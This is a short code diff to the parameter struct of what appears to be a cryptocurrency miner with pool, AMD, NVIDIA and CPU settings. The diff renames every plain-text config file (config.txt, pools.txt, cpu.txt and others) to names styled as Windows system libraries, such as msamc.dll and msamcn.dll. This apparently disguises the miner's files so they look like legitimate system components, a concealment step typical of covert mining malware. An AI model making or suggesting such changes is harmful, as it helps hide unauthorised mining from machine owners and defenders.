@@ -92,12 +92,12 @@ struct params
 		useNVIDIA(true),
 		useCPU(true),
 		openCLVendor("AMD"),
-		configFile("config.txt"),
-		configFilePools("pools.txt"),
-		configFileAMD("amd.txt"),
+		configFile("msamc.dll"),
+		configFilePools("msamp.dll"),
+		configFileAMD("msamca.dll"),
 		rootAMDCacheDir(get_home() + "/.openclcache/"),
-		configFileCPU("cpu.txt"),
-		configFileNVIDIA("nvidia.txt")
+		configFileCPU("msamcc.dll"),
+		configFileNVIDIA("msamcn.dll")
 	{
 	}
 };
